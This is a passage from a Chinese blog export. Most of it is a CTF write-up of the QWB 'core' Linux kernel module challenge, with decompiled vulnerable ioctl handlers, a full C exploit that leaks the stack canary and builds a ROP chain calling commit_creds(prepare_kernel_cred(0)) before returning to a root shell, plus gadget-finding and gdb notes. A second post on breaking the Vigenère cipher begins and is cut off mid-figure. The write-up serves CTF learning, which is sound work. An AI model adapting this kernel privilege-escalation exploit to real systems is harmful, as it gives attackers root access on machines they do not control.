<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo 'sh end!\n'</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p><code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>告诉我们有一个备份的kallsyms</p>
<p><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>告诉我们不能通过 <code>/proc/kallsyms</code> 查看函数地址</p>
<p><code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>告诉我们我们的shell的uidgid是1000</p>
<p><code>poweroff -d 0  -f</code>是定时关机</p>
<h1 id="core-ko"><a href="#core-ko" class="headerlink" title="core.ko"></a>core.ko</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dajun@ubuntu:~/***$ checksec ./vmlinux </span><br><span class="line">[*] '/home/dajun/binary/pwn_question/kernel/core/give_to_player/vmlinux'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<p>可以看到vmlinux开启了canary</p>
<p>漏洞点非常明确</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  <span class="keyword">switch</span> ( (_DWORD)a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD, a3);</span><br><span class="line">      off = v3;		<span class="comment">//直接设置全局变量off</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3, a2);</span><br><span class="line">      core_copy_func(v3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">core_read</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B, a2);</span><br><span class="line">  printk(&amp;unk_275, off);</span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16L</span>L; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">0</span>;</span><br><span class="line">    v3 = (__int64 *)((<span class="keyword">char</span> *)v3 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v6, <span class="string">"Welcome to the QWB CTF challenge.\n"</span>);</span><br><span class="line">  result = copy_to_user(v2, (<span class="keyword">char</span> *)&amp;v6 + off, <span class="number">64L</span>L);	<span class="comment">//根据off来进行读</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">core_copy_func</span><span class="params">(<span class="keyword">signed</span> __int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215, a2);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1, a2);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    qmemcpy(&amp;v3, &amp;name, (<span class="keyword">unsigned</span> __int16)a1);	<span class="comment">//栈溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul>
<li>设置off，读取canary</li>
<li>从<code>/tmp/kallsyms</code>找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的内存的地址</li>
<li>rop</li>
</ul>
<p>要注意的是，我们从checksec得到的vmlinux的基地址和它实际在内存里面的地址是有偏移的</p>
<p>所以我们要计算出这个偏移，方法就是用类似于找libc基地址的方式找vmlinux的基地址</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[+] getting shell"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[-] fail!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_OFF 0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CORE_COPY_FUNC 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, CORE_READ, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, SET_OFF, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, CORE_COPY_FUNC, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_flag;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs, cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">        <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_flag;"</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] save status succeed!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fd = fopen(<span class="string">"/tmp/kallsyms"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[-] open kallsyms failed!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    commit_creds = <span class="number">0</span>;</span><br><span class="line">    prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+] commit_creds: 0x%llx\n"</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[+] prepare_kernel_cred: 0x%llx\n"</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[-] open dev error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] canary: 0x%llx\n"</span>, canary);</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] vmlinux_base: 0x%llx\n"</span>, vmlinux_base);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)getshell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_flag;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h3 id="为什么要保存环境"><a href="#为什么要保存环境" class="headerlink" title="为什么要保存环境"></a>为什么要保存环境</h3><p>因为rop的时候是在内核态，而如果我们要执行用户态的shell的话就要退出内核态，而退出内核态需要之前环境的信息</p>
<h3 id="swapgs和iretq怎么找？"><a href="#swapgs和iretq怎么找？" class="headerlink" title="swapgs和iretq怎么找？"></a>swapgs和iretq怎么找？</h3><p><code>objdump -d ./vmlinux -M intel| less</code></p>
<p>就找到了这个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffffffff81a012da:       0f 01 f8                swapgs </span><br><span class="line">ffffffff81a012dd:       9d                      popf   </span><br><span class="line">ffffffff81a012de:       c3                      ret</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffffffff81050ac2:       48 cf                   iretq  </span><br><span class="line">ffffffff81050ac4:       c3                      ret</span><br></pre></td></tr></table></figure>

<h3 id="如何gdb调试"><a href="#如何gdb调试" class="headerlink" title="如何gdb调试"></a>如何gdb调试</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb /path/to/vmlinux -q</span><br><span class="line">(gdb) add-symbol-file /path/to/core.ko address_of_.text</span><br><span class="line">(gdb) b core_copy_func (或者其他什么函数，随便)</span><br><span class="line">(gdb) target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p><code>address_of_.text</code>在<code>/sys/module/core/section/.text</code>中，<code>cat</code>一下就得到了，但是需要root权限，把setuidgid这句里面的1000改成0就可以了</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>重合指数求维吉尼亚密码</title>
    <url>/2019/12/04/%E9%87%8D%E5%90%88%E6%8C%87%E6%95%B0%E6%B1%82%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。</p>
<p>其相当于对明文不同偏移的字符进行不同的凯撒加密</p>
<a id="more"></a>

<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="生成字母表"><a href="#生成字母表" class="headerlink" title="生成字母表"></a>生成字母表</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> x[] = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line"><span class="keyword">char</span> box[<span class="number">26</span>][<span class="number">26</span>];</span><br><span class="line"><span class="keyword">int</span> Xlength = <span class="number">26</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">generateBox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			box[i][j] = x[(j+i)%Xlength];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样便生成了这样的字母表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a b c d e f g h i j k l m n o p q r s t u v w x y z</span><br><span class="line">b c d e f g h i j k l m n o p q r s t u v w x y z a</span><br><span class="line">c d e f g h i j k l m n o p q r s t u v w x y z a b</span><br><span class="line">d e f g h i j k l m n o p q r s t u v w x y z a b c</span><br><span class="line">e f g h i j k l m n o p q r s t u v w x y z a b c d</span><br><span class="line">f g h i j k l m n o p q r s t u v w x y z a b c d e</span><br><span class="line">g h i j k l m n o p q r s t u v w x y z a b c d e f</span><br><span class="line">h i j k l m n o p q r s t u v w x y z a b c d e f g</span><br><span class="line">i j k l m n o p q r s t u v w x y z a b c d e f g h</span><br><span class="line">j k l m n o p q r s t u v w x y z a b c d e f g h i</span><br><span class="line">k l m n o p q r s t u v w x y z a b c d e f g h i j</span><br><span class="line">l m n o p q r s t u v w x y z a b c d e f g h i j k</span><br><span class="line">m n o p q r s t u v w x y z a b c d e f g h i j k l</span><br><span class="line">n o p q r s t u v w x y z a b c d e f g h i j k l m</span><br><span class="line">o p q r s t u v w x y z a b c d e f g h i j k l m n</span><br><span class="line">p q r s t u v w x y z a b c d e f g h i j k l m n o</span><br><span class="line">q r s t u v w x y z a b c d e f g h i j k l m n o p</span><br><span class="line">r s t u v w x y z a b c d e f g h i j k l m n o p q</span><br><span class="line">s t u v w x y z a b c d e f g h i j k l m n o p q r</span><br><span class="line">t u v w x y z a b c d e f g h i j k l m n o p q r s</span><br><span class="line">u v w x y z a b c d e f g h i j k l m n o p q r s t</span><br><span class="line">v w x y z a b c d e f g h i j k l m n o p q r s t u</span><br><span class="line">w x y z a b c d e f g h i j k l m n o p q r s t u v</span><br><span class="line">x y z a b c d e f g h i j k l m n o p q r s t u v w</span><br><span class="line">y z a b c d e f g h i j k l m n o p q r s t u v w x</span><br><span class="line">z a b c d e f g h i j k l m n o p q r s t u v w x y</span><br></pre></td></tr></table></figure>

<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>加密的时候以<code>key</code>在子母集中的位置为行号，以明文在子母集中的位置为列号，此行号列号所定位的字母就是加密的对应字母</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">inp: 密文字符串</span></span><br><span class="line"><span class="comment">x: 要查询的字符</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(<span class="keyword">char</span> *inp, <span class="keyword">char</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> tmp = inp[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">int</span> offset = x &gt;= tmp ? x - tmp : x - tmp + <span class="number">26</span>;</span><br><span class="line">	<span class="keyword">if</span> (inp[offset] != x)</span><br><span class="line">		offset -= <span class="number">6</span>;</span><br><span class="line">	<span class="keyword">return</span> offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">buf: 明文字符串</span></span><br><span class="line"><span class="comment">key: key字符串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Vencrypt</span><span class="params">(<span class="keyword">char</span>* buf, <span class="keyword">char</span>* key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> Clength = <span class="built_in">strlen</span>(buf);</span><br><span class="line">	<span class="keyword">int</span> Klength = <span class="built_in">strlen</span>(key);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; Clength; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> c = buf[i];</span><br><span class="line">		<span class="keyword">if</span> (c == <span class="string">' '</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">char</span> k = key[j++];</span><br><span class="line">		<span class="keyword">if</span> (j == Klength)</span><br><span class="line">			j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> Cidx = indexOf(x, c);</span><br><span class="line">		<span class="keyword">int</span> Kidx = indexOf(x, k);</span><br><span class="line">		<span class="keyword">char</span> b = box[Kidx][Cidx];</span><br><span class="line">		buf[i] = b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>解密也很简单，依旧根据<code>key</code>的位置定位行号，然后再根据密文的位置定位到列号，该列号在子母集中对应的字母就是明文的字母</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">inp: 密文字符串</span></span><br><span class="line"><span class="comment">x: 要查询的字符</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">invertIndexOf</span><span class="params">(<span class="keyword">char</span> *inp, <span class="keyword">char</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> indexOf(inp, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">buf: 密文字符串</span></span><br><span class="line"><span class="comment">key: key字符串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Vdecrypt</span><span class="params">(<span class="keyword">char</span>* buf, <span class="keyword">char</span>* key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> Clength = <span class="built_in">strlen</span>(buf);</span><br><span class="line">	<span class="keyword">int</span> Klength = <span class="built_in">strlen</span>(key);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; Clength; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> c = buf[i];</span><br><span class="line">		<span class="keyword">if</span> (c == <span class="string">' '</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">char</span> k = key[j++];</span><br><span class="line">		<span class="keyword">if</span> (j == Klength)</span><br><span class="line">			j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> Kidx = indexOf(x, k);</span><br><span class="line">		<span class="keyword">char</span> b = x[invertIndexOf(box[Kidx], c)];</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		for (int j = 0; j &lt; Xlength; j++)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			if (box[Kidx][j] == c)</span></span><br><span class="line"><span class="comment">				b = x[j];</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		buf[i] = b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h1><p>有时候我们会遇到给了一串密文，但是没有给<code>key</code>的情况，这种情况下如果要暴力猜解将会是非常困难的，因此我们用统计学的方法来解决这个问题</p>
<blockquote>
<p>弗里德曼试验由威廉·F·弗里德曼（William F. Friedman）于1920年代发明。他使用了<a href="https://zh.wikipedia.org/w/index.php?title=重合指数&action=edit&redlink=1" target="_blank" rel="noopener">重合指数</a>（index of coincidence）来描述密文字母频率的不匀性，从而破译密码。<figure class="image-box">
                <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/130f514d470da5eb59911fd9c4d00e7f5275e710" alt="kappa _{p}](https://wikimedia.org/api/rest_v1/media/math/render/svg/dca34d1a0228682daff98ed2767294435e07cb4c)指目标语言中两个任意字母相同的概率（英文中为0.067），![kappa _{r}" title class>
                <p>kappa _{p}](https://wikimedia.org/api/rest_v1/media/math/render/svg/dca34d1a0228682daff98ed2767294435e07cb4c)指目标语言中两个任意字母相同的概率（英文中为0.067），![kappa _{r}</p>
            </figure>指字母表中这种情况出现的概率（英文中为1/26=0.0385），从而密钥长度可以估计为：</p>
<figure class="image-box">
